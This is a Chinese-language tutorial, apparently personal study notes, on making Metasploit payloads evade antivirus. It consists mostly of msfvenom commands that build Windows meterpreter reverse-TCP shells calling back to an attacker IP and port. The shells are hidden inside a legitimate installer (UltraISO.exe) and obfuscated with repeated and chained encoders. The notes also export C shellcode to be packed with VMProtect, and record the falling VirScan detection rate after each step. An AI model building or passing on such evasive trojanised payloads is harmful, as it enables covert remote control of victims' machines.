杀软是如何检测出恶意代码的？
特征码、启发式恶意软件检查和行为。
免杀是做什么？
对特征进行混淆，打乱代码，避免杀毒软件查杀
免杀的基本方法有哪些？
自编码处理  自捆绑+编码  多重编码   接口下载式  签名伪装式

针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：

改变特征码
改变行为
其它

由于msf被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果

要用到的在线查毒工具virscan提供

https://www.virscan.org/

# 一、不处理payload直接生成样本进行检测

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.32 LPORT=4456 -f exe -o payload1.exe

![[1645511560404.png]]

进行查毒有41%的杀毒软件报毒了

具体查毒链接：https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9

![[1645511550808.png]]

# 二、 MSF自编码处理payload生成样本进行检测

首先我们输入   msfvenom --list encoders   查看可以用编码模块

![[1645511543145.png]]

我们使用  x86/shikata_ga_nai 模块 免杀中使用频率最高的一个编码器

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai HOST=192.168.110.110  LPORT=4456 -f exe -o payload1.exe

进行查毒有37%的杀毒软件报毒了

![[1645511533351.png]]

# 三、MSF自捆绑处理payload生成样本进行检测

使用msfvenom的-x参数可以指定一个可执行文件,将payload与其捆绑

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -x UltraISO.exe -f exe -o payload2.exe

![[1645511525813.png]]

进行查毒有37%的杀毒软件报毒了

![[1645511516751.png]]

# 四、MSF自捆绑+编码处理payload生成样本进行检测

结合第二种，第三种。编码方式我们再次生成样本

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe

![[1645511507586.png]]

进行查毒有31%的杀毒软件报毒了

![[1645511497457.png]]

那我们继续增加编码次数

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe

进行查毒有27%的杀毒软件报毒了!

![[1645511487704.png]]

# 五、MSF多重编码payload生成样本进行检测

通过管道，让msfvenom用不同编码器反复编码进行混淆。使用管道让msfvenom对攻击载荷多重编码，先用shikata_ga_nai编码10次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成以payload5.exe为模板的可执行文件。

msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=192.168.110.110 LPORT=4456 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe

# 六、 生成Shellcode使用C语言调用

1、直接在linux中利用msf的meterpreter生成的文件以.c形式文件存储，得到机器码。命令：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -f c >c0001.c

![[1645511458128.png]]

2、改c文件，并编译，并加壳

![[1645511469800.png]]

随便写一个hello world

main() {
printf("hello world\n");
}

然后编译 并加壳

vmp加壳工具